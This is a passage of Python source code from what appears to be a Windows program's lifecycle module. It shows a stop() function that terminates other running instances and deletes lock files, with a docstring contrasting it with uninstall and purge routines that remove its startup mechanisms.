        machine_state.forget("acl")
        machine_state.forget("tasks")
        machine_state.forget("wmi")
        machine_state.forget("startup")
    except Exception:
        pass
    return removed


def stop() -> list[str]:
    """Kill running instances and clear the locks. Keep every vector.

    Distinct from ``uninstall`` (which also drops the vectors) and ``purge``
    (which drops the anchor, the runtime and the machine-wide changes too).
    """
    from .. import config
    removed: list[str] = []
    killed = terminate_running_instances(exclude_pid=os.getpid())
    if killed:
        removed.append("stopped: " + ", ".join(str(p) for p in killed))
    for ctemp in _candidate_temps():
        for fname in _lock_names():
            path = os.path.join(ctemp, fname)
            try:
                if os.path.exists(path):
                    os.remove(path)
                    removed.append(f"lock file ({path})")
            except OSError:
                pass
    return removed
